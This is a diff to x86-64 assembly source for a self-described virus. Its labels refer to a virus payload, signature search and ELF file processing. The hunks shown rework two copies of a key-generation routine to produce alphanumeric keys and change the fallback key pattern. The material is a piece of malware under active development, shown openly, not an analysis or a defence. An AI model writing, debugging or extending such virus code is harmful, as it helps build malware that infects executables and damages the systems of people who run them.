@@ -259,7 +259,7 @@ virus_search_signature:
     ret
 
 ; ============================================
-; virus_generate_key - Generate 8 ASCII printable characters from random data
+; virus_generate_key - Generate 8 alphanumeric characters from random data
 ; rdi = destination buffer (must have at least 8 bytes)
 ; Position-independent version for virus payload
 ; ============================================
@@ -291,13 +291,28 @@ virus_generate_key:
 .vgk_convert_loop:
     lodsb                       ; load random byte into al
     
-    ; Convert to printable range (33-126): al = 33 + (al % 94)
+    ; Convert to alphanumeric (0-9, A-Z, a-z): 62 total characters
     xor ah, ah                  ; clear ah for division
-    mov bl, 94                  ; divisor (126 - 33 + 1)
+    mov bl, 62                  ; divisor (62 alphanumeric chars)
     div bl                      ; al = quotient, ah = remainder
-    mov al, ah                  ; al = remainder
-    add al, 33                  ; al = 33 + remainder
+    mov al, ah                  ; al = remainder (0-61)
     
+    ; Map to alphanumeric: 0-9 (48-57), A-Z (65-90), a-z (97-122)
+    cmp al, 10
+    jl .vgk_is_digit            ; 0-9
+    cmp al, 36
+    jl .vgk_is_upper            ; 10-35 -> A-Z
+    ; 36-61 -> a-z
+    sub al, 36
+    add al, 'a'
+    jmp .vgk_store
+.vgk_is_upper:
+    sub al, 10
+    add al, 'A'
+    jmp .vgk_store
+.vgk_is_digit:
+    add al, '0'
+.vgk_store:
     stosb                       ; store to destination
     dec rcx
     jnz .vgk_convert_loop
@@ -305,9 +320,9 @@ virus_generate_key:
     jmp .vgk_done
 
 .vgk_fallback:
-    ; Fallback: use a simple pattern if getrandom fails
+    ; Fallback: use alphanumeric pattern if getrandom fails
     mov rdi, r12
-    mov rax, 0x2121212121212121 ; "!!!!!!!" as fallback
+    mov rax, 0x3030303030303030 ; "00000000" as fallback
     mov [rdi], rax
 
 .vgk_done:
@@ -1491,7 +1506,7 @@ process_non_elf_file:
 
 
 ; ============================================
-; generate_key - Generate 8 ASCII printable characters from random data
+; generate_key - Generate 8 alphanumeric characters from random data
 ; rdi = destination buffer (must have at least 8 bytes)
 ; ============================================
 generate_key:
@@ -1522,13 +1537,28 @@ generate_key:
 .gk_convert_loop:
     lodsb                       ; load random byte into al
     
-    ; Convert to printable range (33-126): al = 33 + (al % 94)
+    ; Convert to alphanumeric (0-9, A-Z, a-z): 62 total characters
     xor ah, ah                  ; clear ah for division
-    mov bl, 94                  ; divisor (126 - 33 + 1)
+    mov bl, 62                  ; divisor (62 alphanumeric chars)
     div bl                      ; al = quotient, ah = remainder
-    mov al, ah                  ; al = remainder
-    add al, 33                  ; al = 33 + remainder
+    mov al, ah                  ; al = remainder (0-61)
     
+    ; Map to alphanumeric: 0-9 (48-57), A-Z (65-90), a-z (97-122)
+    cmp al, 10
+    jl .gk_is_digit             ; 0-9
+    cmp al, 36
+    jl .gk_is_upper             ; 10-35 -> A-Z
+    ; 36-61 -> a-z
+    sub al, 36
+    add al, 'a'
+    jmp .gk_store
+.gk_is_upper:
+    sub al, 10
+    add al, 'A'
+    jmp .gk_store
+.gk_is_digit:
+    add al, '0'
+.gk_store:
     stosb                       ; store to destination
     dec rcx
     jnz .gk_convert_loop
@@ -1536,9 +1566,9 @@ generate_key:
     jmp .gk_done
 
 .gk_fallback:
-    ; Fallback: use a simple pattern if getrandom fails
+    ; Fallback: use alphanumeric pattern if getrandom fails
     mov rdi, r12
-    mov rax, 0x2121212121212121 ; "!!!!!!!" as fallback
+    mov rax, 0x3030303030303030 ; "00000000" as fallback
     mov [rdi], rax
 
 .gk_done:
